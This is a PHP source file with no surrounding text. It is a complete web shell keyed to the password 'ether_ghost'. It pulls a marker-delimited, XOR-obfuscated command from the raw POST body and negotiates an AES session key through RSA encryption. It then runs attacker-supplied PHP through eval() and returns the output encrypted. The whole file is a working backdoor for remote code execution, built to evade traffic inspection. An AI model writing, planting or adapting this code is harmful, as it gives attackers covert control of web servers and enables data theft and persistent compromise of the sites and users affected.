<?php
session_start();
$pass = "ether_ghost";
$start_mask = substr(pack('H*', md5($pass)), 0, 8);
$stop_mask = substr(pack('H*', md5($pass)), 8, 8);

$post = file_get_contents("php://input");
$start = strpos($post, $start_mask) + 8;
$end = strpos($post, $stop_mask, $start);
if ($start == false || $end == false) {
    die();
}

$obfs = substr($post, $start, $end - $start);
$k = substr($obfs, 0, 8);
$call = "";
for($i = 8; $i < strlen($obfs); $i += 8) {
    $call .= substr($obfs, $i, 8) ^ $k;
}

$action = substr($call, 0, 3); # set run
$data = substr($call, 3);


function obfs_echo($s) {
    global $start_mask, $stop_mask;
    echo $start_mask . $s . $stop_mask;
}

function aes_enc($data) {
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
    $encryptedData = openssl_encrypt(
        $data,
        'AES-256-CBC',
        $_SESSION["ether_ghost_enc_key"],
        0,
        $iv
    );
    return ($iv . base64_decode($encryptedData));
}

function aes_dec($encryptedData) {
    return openssl_decrypt(
        base64_encode(substr($encryptedData, 16)),
        'AES-256-CBC',
        $_SESSION["ether_ghost_enc_key"],
        0,
        substr($encryptedData, 0, 16)
    );
}

if($action == "set") {
    if(!extension_loaded('openssl')){
        obfs_echo("WRONG_NO_OPENSSL");
    }else if(!function_exists("openssl_public_encrypt")){
        obfs_echo("WRONG_NO_OPENSSL_FUNCTION");
    }else{
        $_SESSION["ether_ghost_enc_key"] = openssl_random_pseudo_bytes(32);
        openssl_public_encrypt(
            $_SESSION["ether_ghost_enc_key"],
            $encrypted,
            $data,
            OPENSSL_PKCS1_OAEP_PADDING
        );
        obfs_echo(base64_encode($encrypted));
    }

}else if($action == "run") {
    if(!isset($_SESSION["ether_ghost_enc_key"])){
        obfs_echo("WRONG_NO_SESSION");
    }else if(!extension_loaded('openssl')) {
        obfs_echo("WRONG_NO_OPENSSL");
    }else{
        ob_start();
        eval(aes_dec($data));
        $output = ob_get_contents();
        ob_end_flush();
        obfs_echo(aes_enc($output));
    }
}